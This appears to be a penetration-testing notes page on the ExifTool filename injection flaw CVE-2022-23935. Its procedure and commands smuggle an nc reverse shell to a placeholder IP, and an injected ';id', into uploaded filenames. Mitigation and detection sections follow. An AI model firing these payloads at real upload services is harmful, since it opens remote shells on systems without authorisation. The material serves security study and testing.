---
topic: ExifTool — filename injection (CVE-2022-23935)
tags: [linux, exiftool, command-injection, upload, cve-2022-23935]
---

# ExifTool — filename injection (CVE-2022-23935)

**English** | [🌐 Español](exiftool-filename-injection.md)

## Concept

ExifTool before 12.38 does not properly neutralize certain filenames when building an internal operation. A filename with metacharacters can execute a command when the application processes the image. The flaw is not in the metadata but in the name passed to the tool.

## When it applies

- The web app uploads images and runs ExifTool to build reports or thumbnails.
- The original filename is preserved and passed to the tool.
- The version is older than 12.38 or the wrapper has not been reviewed.

## Procedure

1. Confirm the version from the response, report or binary.
2. Upload a valid image whose name contains the separator and command.
3. Listen on the chosen port and verify execution.
4. Repeat with a reverse shell if the simple command works.

## Commands

```bash
cp photo.jpg 'photo.jpg; busybox nc <IP> <PORT> -e sh'
curl -F 'image=@photo.jpg;filename=photo.jpg;id' http://<HOST>/upload
# Check the version
curl -s http://<HOST>/report | grep -i exiftool
```

## Variants

- Inject through a newline when the wrapper uses an argument list.
- Abuse a save path derived from the filename.
- Combine it with an upload that lets you choose the final name.

## Limitations

- The fixed version (12.38+) neutralizes the filename.
- The application may rename the file before calling ExifTool.
- The container may lack the tools needed for a reverse shell.

## Mitigation

- Update ExifTool and use `--` or an argument list without a shell.
- Rename files to a UUID and validate the real MIME type.
- Run processing in a sandbox without outbound network.

## Detection

- Filenames containing `;`, `|`, `$()` or newlines.
- Child processes of the web app spawning shells or `nc`.
- Old ExifTool versions in reports.

## References

- [0xdf — Investigation](https://0xdf.gitlab.io/2023/04/22/htb-investigation.html)
- [NVD — CVE-2022-23935](https://nvd.nist.gov/vuln/detail/CVE-2022-23935)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
